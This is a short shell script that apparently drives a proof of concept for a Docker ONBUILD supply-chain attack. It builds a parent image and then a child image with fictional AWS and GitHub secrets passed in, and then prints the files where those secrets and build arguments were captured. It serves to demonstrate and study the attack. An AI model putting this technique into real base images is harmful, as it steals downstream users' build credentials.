#!/bin/sh

docker build -t onbuild-supplychain-attack-poc-parent -f Dockerfile .

# entirely fictional secret values
export AWS_SECRET="729e295a-ab04-45b6-9840-87f6fe115d1c"
export GITHUB_TOKEN="cc4f9e5a-702d-47df-aae0-4934817140ab"

docker build \
  --secret id=aws,env=AWS_SECRET \
  --secret id=github_token,env=GITHUB_TOKEN \
  -t onbuild-supplychain-attack-poc-child -f Dockerfile-child . --no-cache

echo secrets:
docker run --rm -it onbuild-supplychain-attack-poc-child cat /app/secrets
printf \\n\\n
echo build-args and env:
docker run --rm -it onbuild-supplychain-attack-poc-child cat /app/build-args
